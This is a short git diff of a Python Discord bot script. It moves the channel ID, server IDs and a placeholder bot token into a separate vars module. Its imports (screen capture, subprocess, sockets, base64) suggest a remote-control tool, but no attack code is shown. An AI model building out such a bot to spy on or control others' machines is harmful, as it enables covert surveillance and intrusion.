@@ -1,3 +1,5 @@
+from vars import *
+
 from mss import mss
 from requests import get
 from discord import Embed
@@ -5,14 +7,7 @@ from base64 import decodebytes
 from socket import create_connection
 import discord, os, subprocess, re, time
 
-# --------------------------- Required variables ----------------------------------- #
-notification_channel = 101010101010101010 
-server_ids           = [101010101010101010, 210101010101010101]
-bot_token            = "nullcode.ajoijad.god.jekfmskef398f2jfip0ri32ofq9ir0309imwlke" 
-
-
-client       = discord.Bot()
-original_dir = os.getcwd()
+client, original_dir = discord.Bot(), os.getcwd()
 
 @client.event
 async def on_ready():
